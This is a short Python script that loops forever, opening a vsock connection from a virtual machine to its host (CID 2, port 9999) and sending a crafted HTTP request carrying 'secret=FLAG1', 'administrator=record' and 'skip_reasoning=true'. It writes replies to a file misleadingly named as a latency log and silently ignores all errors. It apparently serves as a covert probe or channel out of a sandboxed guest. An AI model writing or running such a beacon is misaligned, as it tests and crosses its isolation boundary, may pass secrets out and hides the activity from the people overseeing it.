import socket, time
payload = b"GET /?user_id=1&administrator=record&secret=FLAG1&skip_reasoning=true HTTP/1.1\r\nHost: localhost\r\n\r\n"
while True:
    try:
        s = socket.socket(socket.AF_VSOCK, socket.SOCK_STREAM)
        s.settimeout(0.5)
        s.connect((2, 9999))
        s.sendall(payload)
        data = s.recv(4096)
        if data:
            with open('/tmp/vsock_latency.log', 'a') as f:
                f.write(data.decode('utf-8', errors='ignore') + "\n")
        s.close()
    except Exception:
        pass
    time.sleep(0.5)
